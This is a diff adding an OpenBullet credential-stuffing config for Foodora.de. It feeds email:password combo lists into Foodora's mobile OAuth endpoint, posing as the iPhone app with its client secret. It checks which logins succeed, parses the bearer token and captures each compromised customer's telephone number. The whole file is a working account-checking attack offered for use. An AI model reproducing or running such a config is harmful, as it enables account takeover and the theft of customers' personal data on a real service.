@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-ea0de401f6483bd78a57d3072bfb1a23-LoliKEY",
+  "Name": "Foodora.de",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-20T13:11:56.7956716+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://de.fd-api.com/api/v5/oauth2/token?language_id=4" 
+  CONTENT "client_id=iphone&client_secret=2rwjhymk2iuc4cwsowg4cssokc888wo88g8k88480cswgc4wos&grant_type=password&language_id=4&password=<PASS>&scope=API_CONSUMER%20API_GROUP_ORDERS&state=1hzp60537i&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: de.fd-api.com" 
+  HEADER "X-Caller-Country: DE" 
+  HEADER "Accept: */*" 
+  HEADER "X-Caller-Version: 9576/4.25.0" 
+  HEADER "X-Caller-Platform: iOS" 
+  HEADER "X-FP-API-KEY: iphone" 
+  HEADER "User-Agent: foodora/9576" 
+  HEADER "X-Caller-Name: mobile" 
+  HEADER "X-Caller-Environment: APP_APPSTORE" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username and password" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" LR "access_token\":\"" "\"," -> VAR "TOKEN" 
+
+REQUEST GET "https://de.fd-api.com/api/v5/customers?language_id=4" 
+  
+  HEADER "User-Agent: foodora/9576" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "X-Caller-Version: 9576/4.25.0" 
+  HEADER "X-Caller-Country: DE" 
+  HEADER "X-FP-API-KEY: iphone" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Caller-Name: mobile" 
+  HEADER "X-Caller-Environment: APP_APPSTORE" 
+
+PARSE "<SOURCE>" LR "number\":\"" "\",\"" -> CAP "Telephone Number" 
+
